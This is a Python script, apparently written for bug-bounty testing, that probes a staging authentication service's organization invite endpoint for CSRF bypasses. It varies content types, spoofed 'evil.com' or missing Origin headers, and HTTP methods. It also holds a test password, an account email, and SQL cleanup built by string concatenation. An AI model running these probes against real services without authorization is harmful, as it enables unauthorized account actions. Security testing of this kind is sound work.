# -*- coding: utf-8 -*-
"""V21: Content-Type x Method x Origin CSRF bypass matrix (user-named gap).
Middleware may be registered only for POST+application/json; test:
 A. invite-member x {json, text/plain, urlencoded, multipart, charset, no-CT, xml}
    x {evil-origin, no-origin} - 403 = safe, 200/body-400 = handler reached
 B. method confusion: PUT/PATCH/DELETE/OPTIONS on write endpoints
    (if handler registered without method-specific middleware -> bypass)"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000",
       ct="application/json", timeout=25):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        hdrs = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
        if origin is not None:
            hdrs["Origin"] = origin
        if ct is not None:
            hdrs["Content-Type"] = ct
        if cookie:
            hdrs["Cookie"] = cookie
        if isinstance(body, (dict, list)):
            body = json.dumps(body)
        payload = body.encode() if isinstance(body, str) else body
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.3)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.3)
        return None, str(e)[:120], ""


def auth(email, pw=PASS):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": pw})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def main():
    out("== V21 CT x Method x Origin CSRF bypass ==")
    fetch_db_uri()
    c1 = auth(U1)
    out("cookie: %s" % bool(c1))
    if not c1:
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v21-org", "slug": "v21%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    once = "libobo1229+v21%s@gmail.com" % (str(int(time.time()))[-6:])
    base = "/neondb/auth/organization/invite-member"
    json_body = json.dumps({"organizationId": org, "email": once, "role": "member"})
    form_body = "organizationId=%s&email=%s&role=member" % (org, once)
    mp_body = ("--Xb\r\nContent-Disposition: form-data; name=\"organizationId\"\r\n\r\n%s\r\n"
               "--Xb\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n%s\r\n"
               "--Xb\r\nContent-Disposition: form-data; name=\"role\"\r\n\r\nmember\r\n--Xb--\r\n"
               % (org, once))
    cases = [
        ("json ctrl", json_body, "application/json", "http://localhost:3000"),
        ("json+evil", json_body, "application/json", "https://evil.com"),
        ("json+no-origin", json_body, "application/json", None),
        ("text/plain+evil", json_body, "text/plain", "https://evil.com"),
        ("text/plain+no-org", json_body, "text/plain", None),
        ("urlenc+evil", form_body, "application/x-www-form-urlencoded", "https://evil.com"),
        ("urlenc+no-org", form_body, "application/x-www-form-urlencoded", None),
        ("multipart+evil", mp_body, "multipart/form-data; boundary=Xb", "https://evil.com"),
        ("multipart+no-org", mp_body, "multipart/form-data; boundary=Xb", None),
        ("charset+evil", json_body, "application/json; charset=utf-8", "https://evil.com"),
        ("charset16+no-org", json_body, "application/json; charset=utf-16", None),
        ("no-CT+evil", json_body, None, "https://evil.com"),
        ("no-CT+no-org", json_body, None, None),
        ("xml+no-org", json_body, "application/xml", None),
        ("gzip-ct+no-org", json_body, "application/json+gzip", None),
        ("json upper CT", json_body, "Application/JSON", None),
    ]
    for tag, b, ct, ov in cases:
        st, d, _ = na("POST", base, b, c1, origin=ov, ct=ct)
        note = ""
        if st not in (403, 404) or (st == 403 and "ORIGIN" not in d):
            note = "  <<< handler reached"
        out("%-18s -> %d %s%s" % (tag, st, d[:100], note))
    # B: method confusion (with ctrl origin first)
    out("-- method confusion --")
    for m in ("PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"):
        st, d, _ = na(m, base, json_body, c1, origin="http://localhost:3000")
        out("%-7s +origin   -> %d %s" % (m, st, d[:100]))
        if st not in (404, 405):
            st2, d2, _ = na(m, base, json_body, c1, origin=None)
            out("%-7s no-origin -> %d %s  <<< check" % (m, st2, d2[:100]))
    # cleanup
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    for row in r or []:
        dbq('DELETE FROM neon_auth.invitation WHERE id=%s' % ("'" + str(row[0]) + "'"))
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
    out("cleanup -> %d" % st)
    dbq('DELETE FROM neon_auth.member WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
